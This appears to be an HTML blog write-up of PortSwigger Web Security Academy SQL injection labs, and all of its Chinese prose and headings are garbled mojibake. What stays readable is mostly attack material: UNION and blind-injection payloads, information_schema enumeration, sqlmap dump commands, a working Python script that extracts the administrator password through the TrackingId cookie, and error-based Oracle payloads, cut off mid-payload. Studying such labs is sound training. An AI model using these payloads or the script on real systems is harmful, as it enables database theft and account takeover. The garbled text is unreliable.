    <content><![CDATA[<h2 id="SQLæ³¨å…¥æ¼æ´è¯­å¥å…è®¸æ£€ç´¢éšè—æ•°æ®çš„ä½ç½®">SQLæ³¨å…¥æ¼æ´è¯­å¥å…è®¸æ£€ç´¢éšè—æ•°æ®çš„ä½ç½®</h2>
<p>è¿™ä¸ªæ˜¯æŸ¥çœ‹éšè—æ•°æ®çš„æ¼æ´ï¼Œæ¯”è¾ƒç®€å•ã€‚é€šè¿‡BurpSuiteç›´æ¥æ‹¦æˆªä¿®æ”¹å°±è¡Œã€‚</p>
<p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
<p>ä¹‹æ‰€ä»¥èƒ½éšè—ä¿¡æ¯æ˜¯å› ä¸ºåç«¯çš„æŸ¥è¯¢è¯­å¥æ˜¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>å› æ­¤é€šè¿‡æˆ‘ä»¬çš„ä¿®æ”¹æ³¨é‡Šæ‰äº†<code>AND released = 1</code></p>
<p><strong>æ€è€ƒ</strong>ï¼š</p>
<p>é¦–å…ˆå¯¹åç«¯æŸ¥è¯¢è¯­å¥è¦æœ‰ä¸€å®šæ•æ„Ÿç¨‹åº¦ï¼Œå¦å¤–å¦‚æœANDåçš„è¯­å¥åœ¨å‰æ˜¯å¦å°±é¿å…äº†è¿™ä¸ªæ¼æ´å‘¢ï¼Ÿ</p>
<span id="more"></span>
<h2 id="SQLæ³¨å…¥æ¼æ´å…è®¸ç™»å½•ç»•è¿‡">SQLæ³¨å…¥æ¼æ´å…è®¸ç™»å½•ç»•è¿‡</h2>
<p>è¿™ä¸ªä¹Ÿéå¸¸ç®€å•ï¼Œæ³¨é‡Šæ‰passwordå°±å¯ä»¥ç™»å½•ä»»æ„ç”¨æˆ·äº†ã€‚</p>
<p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
<p><strong>æ€è€ƒ</strong>ï¼š</p>
<p>å¯¹ä¹‹å‰æŒ–çš„å‡ ä¸ªå¹³å°åšäº†ä¸€ä¸‹å°è¯•ï¼Œæ²¡å‡ºæ„å¤–éƒ½å¤±è´¥äº†ã€‚æœç„¶è¿™ä¹ˆç®€å•çš„æ´ä¸å¤ªå¥½é‡è§ã€‚</p>
<h2 id="SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°">SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°</h2>
<p>è¿™ä¸ªä½¿ç”¨<code>?category=Accessones' order by 3--</code>æ—¶ä¸æŠ¥é”™ï¼Œä½¿ç”¨<code>?category=Accessones' order by 4--</code>æ—¶æŠ¥é”™ï¼Œè¯´æ˜è¿”å›åˆ—æœ‰ä¸‰ä¸ªã€‚ä½†æ˜¯ä¸èƒ½ç›´æ¥è¿‡å…³ï¼Œéœ€è¦ä½¿ç”¨<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>è¿‡å…³</p>
<p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ‰§è¡Œ<code>order by 4</code>çš„æ—¶å€™æŠ¥é”™ï¼Œä½†æ˜¯æŠ¥é”™ä»£ç ä¸º500è¯´æ˜è¿˜æ˜¯æ‰§è¡Œäº†çš„ã€‚åœ¨portswiggerä¸­æåˆ°ï¼š</p>
<blockquote>
<p>â€‹            As with the <code>ORDER BY</code> technique, the application might actually return the database error in its HTTP response, but may  return a generic error or simply return no results. When the number of  nulls matches the number of columns, the database returns an additional  row in the result set, containing null values in each column. The effect on the HTTP response depends on the applicationâ€™s code. If you are  lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>. In the  worst case, the response might look the same as a response caused by an  incorrect number of nulls. This would make this method ineffective.</p>
</blockquote>
<p>å› æ­¤æŠ¥é”™è¯­å¥å¯ä»¥ä½œä¸ºæ˜¯å¦å­˜åœ¨UNIONæ¼æ´çš„å‚è€ƒ</p>
<p>åœ¨ Oracle ä¸­ï¼Œæ¯ä¸ª SELECT æŸ¥è¯¢éƒ½å¿…é¡»ä½¿ç”¨ FROM å…³é”®å­—ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªæœ‰æ•ˆçš„è¡¨ã€‚Oracle ä¸Šæœ‰ä¸€ä¸ªåä¸º dual çš„å†…ç½®è¡¨ï¼Œå¯ç”¨äºæ­¤ç›®çš„ã€‚å› æ­¤ï¼Œåœ¨ Oracle ä¸Šæ³¨å…¥çš„æŸ¥è¯¢å¿…é¡»å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
<p>MySQL ä¸­ï¼Œ<code>--</code>åå¿…é¡»è·Ÿä¸€ä¸ªç©ºæ ¼ã€‚</p>
<p>æœ‰å…³æ•°æ®åº“ç‰¹å®šè¯­æ³•çš„æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚é˜… <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>ã€‚</p>
<h2 id="SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œæ‰¾åˆ°åŒ…å«æ–‡æœ¬çš„åˆ—">SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œæ‰¾åˆ°åŒ…å«æ–‡æœ¬çš„åˆ—</h2>
<p>è®©æ‰¾å“ªä¸ªåˆ—æ”¯æŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œæ‰¾å‡ºä¸€å…±å¤šå°‘åˆ—ä»¥åï¼ŒæŒ¨ä¸ªè¯•è¯•å°±å¯ä»¥äº†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">æˆ–è€…</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">æˆ–è€…</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLåˆå…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®">SQLåˆå…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®</h2>
<p>è®©æ£€ç´¢å‡ºç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œç„¶åç™»é™†ç®¡ç†å‘˜çš„è´¦å·ã€‚è¿™é“é¢˜çš„é‡ç‚¹æ˜¯å½“é‡åˆ°ä¸¤ä¸ªèƒ½æ£€ç´¢å‡ºå­—ç¬¦ä¸²çš„åˆ—æ—¶ï¼Œå¦‚ä½•åˆ©ç”¨ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•åˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼">SQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•åˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼</h2>
<p>å½“åªæœ‰ä¸€ä¸ªstringåˆ—å¯ä»¥è¢«æ£€ç´¢æ—¶ï¼Œéœ€è¦å°†ä¸¤ä¸ªåˆ—çš„å†…å®¹è¿æ¥åˆ°ä¸€ä¸ªåˆ—ã€‚</p>
<ol>
<li class="lvl-3">
<p>é¦–å…ˆé€šè¿‡ä¹‹å‰çš„åŠæ³•çœ‹çœ‹æœ‰å‡ ä¸ªå¯ä»¥æ£€ç´¢çš„åˆ—</p>
</li>
<li class="lvl-3">
<p>ç„¶åæ£€æµ‹å“ªä¸€ä¸ªåˆ—å¯ä»¥æ£€ç´¢å­—ç¬¦ä¸²</p>
</li>
<li class="lvl-3">
<p>æœ€ååˆå¹¶æ£€ç´¢ç”¨æˆ·åå’Œå¯†ç </p>
</li>
</ol>
<p>é€šè¿‡æ£€æµ‹ï¼Œå¯ä»¥æ£€ç´¢çš„åˆ—æœ‰ä¸¤ä¸ªï¼Œç¬¬äºŒä¸ªå¯ä»¥æ£€ç´¢å­—ç¬¦ä¸²ã€‚å°†ç”¨æˆ·åå’Œå¯†ç åˆå¹¶åˆ°ç¬¬äºŒåˆ—ä¸­å³å¯ï¼Œæ³¨å…¥ä»£ç ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
<p>ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è¯­æ³•æ¥æ‰§è¡Œå­—ç¬¦ä¸²è¿æ¥ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>ã€‚</p>
<p>| Oracle     | <code>                   'foo'||'bar'               </code> |<br>
| ---------- | -------------------------------------------------- |<br>
| Microsoft  | <code>                   'foo'+'bar'               </code>  |<br>
| PostgreSQL | <code>                   'foo'||'bar'               </code> |<br>
| MySQL      | CONCAT(â€˜fooâ€™,â€˜barâ€™)                                |</p>
<p>ç„¶è€Œåœ¨å®é™…æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½åƒé¢˜ç›®æ‰€ç»™å‡ºçš„é‚£æ ·ç›´æ¥è·å¾—è¡¨åå’Œåˆ—åã€‚å› æ­¤ï¼Œç°å®ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆè·å¾—æ•°æ®åº“çš„è¡¨åå’Œåˆ—åï¼Œæ‰èƒ½å¯¹å…¶è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">åˆ—ï¼šusername,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">æ•°æ®:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">åˆ©ç”¨administratorç™»å½•</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-æ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢-MySQL-å’Œ-Microsoft-çš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬">SQL æ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢ MySQL å’Œ Microsoft çš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬</h2>
<p>è·å¾—æ•°æ®åº“çš„ç‰ˆæœ¬å·ï¼Œæ¯”è¾ƒç®€å•ã€‚å„ä¸ªæ•°æ®åº“æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬çš„è¯­å¥å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Oracle</td>
<td><code>SELECT * FROM v$version</code><br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody>
</table>
<p>æŸ¥è¯¢SQLç‰ˆæœ¬çš„è¯­å¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
<p>æ€è€ƒï¼š</p>
<p>å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æ‰§è¡ŒSQLæ³¨å…¥æ—¶ï¼Œä½¿ç”¨<code>--</code>è¿›è¡Œæ³¨é‡Šæ—¶éœ€è¦åœ¨å…¶åæ·»åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œå³<code>-- +</code>ã€‚ç„¶è€Œåˆšå¼€å§‹å¹¶æ²¡æœ‰åŠ ä½†æ˜¯è¿˜æ˜¯è¿‡äº†ï¼Œå› æ­¤éœ€è¦æ³¨æ„ã€‚å¦å¤–è¿™ä¸€é¢˜æ˜¯å¯ä»¥ä½¿ç”¨<code>#</code>æ¥æ³¨é‡Šçš„ï¼Œä½†æ˜¯å‰é¢çš„å´ä¸è¡Œï¼ŒåŸå› ç›®å‰è¿˜ä¸æ˜ç™½ã€‚</p>
<h2 id="SQL-æ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºé-Oracle-æ•°æ®åº“çš„æ•°æ®åº“å†…å®¹">SQL æ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºé Oracle æ•°æ®åº“çš„æ•°æ®åº“å†…å®¹</h2>
<p>è¿™ä¸€é¢˜é¢˜ç›®æ²¡æœ‰ç»™è¡¨å•å’Œåˆ—åï¼Œæ›´åˆ‡åˆå®é™…æƒ…å†µï¼Œå®é™…ä¸Šè·Ÿä¸Šé¢çš„æ˜¯ä¸€è‡´çš„ã€‚ä¸å†è¿‡å¤šå™è¿°ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
<h2 id="åˆ©ç”¨æ¡ä»¶å“åº”è¿›è¡Œç›²ç›®-SQL-æ³¨å…¥">åˆ©ç”¨æ¡ä»¶å“åº”è¿›è¡Œç›²ç›® SQL æ³¨å…¥</h2>
<p>åœ¨å¼€å§‹è¿™é“é¢˜ä¹‹å‰å‘¢ï¼Œæœ‰å¿…è¦äº†è§£ä¸€ä¸‹ï¼Œè¦è§£å†³è¿™é“é¢˜æ˜¯æœ‰ä¸‰ä¸ªå¿…è¦æ¡ä»¶çš„ï¼š</p>
<ol>
<li class="lvl-3">
<p><strong>æ­£ç¡®å’Œé”™è¯¯çš„cookieçš„è¿”å›åŒ…å­˜åœ¨å·®å¼‚</strong></p>
</li>
</ol>
<p>èµ·åˆæˆ‘æ˜¯å¾ˆå›°æƒ‘æˆ‘è¦å¤šä¹ˆå°å¿ƒç¿¼ç¿¼æ‰èƒ½å‘ç°<code>Welcome back!</code>è¿™ä¸€å¥è¯çš„å°å°å·®å¼‚ã€‚ç„¶åæˆ‘å°±æç„¶å¤§æ‚Ÿäº†ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹æ¯”responseåŒ…çš„å¤§å°ï¼Œå¦‚æœä¸ä¸€æ ·å†æ‰¾å‡ºå“ªå„¿ä¸ä¸€æ ·å°±å¯ä»¥äº†ã€‚</p>
<ol start="2">
<li class="lvl-3">
<p><strong>cookieå…è®¸ç›²æ³¨</strong></p>
</li>
</ol>
<p>å³åœ¨cookieåæ·»åŠ <code>'AND '1'='1</code>å’Œæ·»åŠ <code>'AND '1'='2</code>è¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„</p>
<ol start="3">
<li class="lvl-3">
<p><strong>æˆ‘ä»¬è¦æŸ¥è¯¢çš„è¡¨åå’Œåˆ—å</strong></p>
</li>
</ol>
<p>è™½ç„¶é¢˜ç›®ç›´æ¥ç»™äº†æˆ‘ä»¬è¡¨åå’Œåˆ—åï¼Œå½“æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå®é™…æƒ…å†µä¸­å¹¶ä¸ä¼šæœ‰å…¬å¸æ‘†ç€æ´ç»™æˆ‘ä»¬æŒ–ã€‚å› æ­¤æœ‰æ²¡æœ‰åŠæ³•é€šè¿‡ç›²æ³¨è·å¾—æˆ‘ä»¬éœ€è¦çš„è¡¨åå’Œåˆ—åå‘¢ï¼Ÿé‚£å½“ç„¶æ˜¯æœ‰çš„ã€‚</p>
<p>æˆ‘ä»¬è¦çŸ¥é“ï¼Œç›²æ³¨è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸæˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“çš„ã€‚é‚£ä¹ˆï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªè¡¨å•æˆ–è€…åˆ—åï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥äº†è§£çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ç›²æ³¨çš„æ–¹å¼è·å¾—è¡¨åå’Œåˆ—åã€‚</p>
<p>æ‰€ä»¥æ˜¯å¯ä»¥ä½¿ç”¨Pythonå†™è„šæœ¬çˆ†ç ´çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨sqlmapå·¥å…·ï¼Œéå¸¸ç®€ä¾¿ã€‚</p>
<p><font class="notice">æˆ‘æ‰“ç®—å†å†™ä¸€ç¯‡sqlmapçš„ç”¨æ³•æ€»ç»“ï¼Œå…ˆè¿™é‡Œæ’ä¸ªçœ¼</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.é¦–å…ˆè¿›è¡Œsqlæ¼æ´æ‰«æ</span><br><span class="line">sqlmap -u url --cookie <span class="string">&quot;TrackingId=xxx&quot;</span></span><br><span class="line">2.ç„¶åè·å¾—å½“å‰ä½¿ç”¨çš„æ•°æ®åº“åç§°</span><br><span class="line">sqlmap -u url --current-db</span><br><span class="line">3.è·å¾—æ‰€æœ‰è¡¨</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;æ•°æ®åº“å&quot;</span> --tables</span><br><span class="line">4.è·å¾—<span class="built_in">users</span>è¡¨å­—æ®µ</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;æ•°æ®åº“å&quot;</span> -T <span class="string">&quot;users&quot;</span> --dump</span><br><span class="line">5.è·å¾—<span class="built_in">users</span>è¡¨ä¸­çš„ç”¨æˆ·å</span><br><span class="line">sqlmap -u url -D <span class="string">&quot;æ•°æ®åº“å&quot;</span> -T <span class="string">&quot;users&quot;</span> -C <span class="string">&quot;username&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>åœ¨è·å¾—æŸç”¨æˆ·å¯†ç çš„æ—¶å€™ï¼Œæœ¬é¢˜åªéœ€è¦æˆ‘ä»¬è·å¾—<code>administrator</code>çš„å¯†ç å°±å¯ä»¥äº†ï¼Œè€ƒè™‘åˆ°å¯†ç åˆå¤šåˆé•¿ï¼Œé€ä¸ªçˆ†ç ´ä¼šæ¶ˆè€—å¤§é‡çš„æ—¶é—´ï¼Œå› æ­¤æˆ‘ç¼–å†™äº†Pythonè„šæœ¬å•ç‹¬å¯¹<code>administrator</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼Œè„šæœ¬å·²ç»å¾ˆè‡ªåŠ¨åŒ–äº†ï¼Œåªéœ€è¦æŠŠurlå’ŒTrackingIdæ¢æˆå­è‡ªå·±çš„å°±å¯ä»¥äº†ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯·æ±‚çš„URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookieè·å–å¯†ç é•¿åº¦get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†ç ´æŸä¸€ç”¨æˆ·åå¯†ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
<p><font class="notice">å…¶å®ï¼Œæœ¬é¢˜åœ¨çˆ†ç ´æ•°æ®è¡¨æ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Pythonå•ç‹¬å¯¹è¡¨åä¸­å«æœ‰<code>user</code>çš„è¡¨è¿›è¡Œçˆ†ç ´ï¼Œä½†è€ƒè™‘å®é™…æƒ…å†µï¼ŒæŠŠæ‰€æœ‰çš„è¡¨åçˆ†ç ´å‡ºï¼Œå®¹æ˜“è·å¾—æ›´å¤šçš„ä¿¡æ¯</font></p>
<h2 id="å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„ç›²-SQL-æ³¨å…¥">å¸¦æœ‰æ¡ä»¶é”™è¯¯çš„ç›² SQL æ³¨å…¥</h2>
<p>Substringç”¨æ³•ï¼šä½ å¯ä»¥ä»æŒ‡å®šåç§»é‡å¼€å§‹ï¼Œæå–å…·æœ‰æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåç§»é‡ç´¢å¼•æ˜¯ä»1å¼€å§‹è®¡æ•°çš„ã€‚ä»¥ä¸‹æ¯ä¸ªè¡¨è¾¾å¼éƒ½å°†è¿”å›å­—ç¬¦ä¸² <code>ba</code>ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:left">æ•°æ®åº“</th>
<th style="text-align:left">è¯­æ³•</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Oracle</td>
<td style="text-align:left"><code>SUBSTR('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
</tbody>
</table>
<p>è·Ÿä¸Šä¸€é¢˜æ˜¯éå¸¸ç±»ä¼¼çš„ã€‚è®²ä¸€ä¸‹åŸç†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ã€æ·»åŠ å•å¼•å·æ”¶åˆ°é”™è¯¯</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2ã€æ·»åŠ ä¸¤ä¸ªå•å¼•å·é”™è¯¯æ¶ˆå¤±</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3ã€ç¡®è®¤æ˜¯æŸ¥è¯¢é”™è¯¯è€Œä¸æ˜¯å…¶ä»–ç±»å‹é”™è¯¯ã€‚ä¸‹åˆ—è¯­å¥è¡¨æ˜ç›®æ ‡ä¸ºOracle æ•°æ®åº“</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;ï¼ˆé”™è¯¯ï¼‰</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;ï¼ˆæ­£ç¡®ï¼‰</span></span><br><span class="line"><span class="string">4ã€éªŒè¯usersè¡¨å­˜åœ¨</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5ã€éªŒè¯ç”¨æˆ·administratorå­˜åœ¨</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span 